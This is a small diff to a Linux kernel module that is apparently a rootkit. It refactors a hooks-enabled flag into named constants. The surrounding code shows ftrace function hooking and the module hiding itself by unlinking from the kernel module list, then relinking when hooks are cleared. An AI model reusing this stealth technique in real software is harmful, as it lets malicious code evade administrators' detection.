@@ -6,7 +6,7 @@
 #include <linux/slab.h>
 #include <linux/uaccess.h>
 
-static char hooks_enabled = 0;
+static char hooks_enabled = HOOKS_DISABLED;
 static struct list_head *prev_mod;
 
 // callback used by ftrace when rip hits one of our traced funcs.
@@ -198,7 +198,7 @@ static struct hook hooks[HOOK_COUNT] = { (struct hook){
 int setup_hooks(void)
 {
     int i;
-    if (hooks_enabled)
+    if (hooks_enabled == HOOKS_ENABLED)
     {
         pr_warn("hook: skipping setup, hooks are already enabled.\n");
         return 0;
@@ -217,7 +217,7 @@ int setup_hooks(void)
     prev_mod = THIS_MODULE->list.prev;
     list_del(&THIS_MODULE->list);
 
-    hooks_enabled = 1;
+    hooks_enabled = HOOKS_ENABLED;
     return 0;
 }
 
@@ -237,13 +237,13 @@ int clear_hooks(void)
     // unhide from modules list:
     list_add(&THIS_MODULE->list, prev_mod);
 
-    hooks_enabled = 0;
+    hooks_enabled = HOOKS_DISABLED;
     return 0;
 }
 
 int toggle_hooks(void)
 {
-    if (hooks_enabled)
+    if (hooks_enabled == HOOKS_ENABLED)
     {
         clear_hooks();
     }
@@ -256,5 +256,5 @@ int toggle_hooks(void)
 
 char hook_status(void)
 {
-  return hooks_enabled;
+    return hooks_enabled;
 }
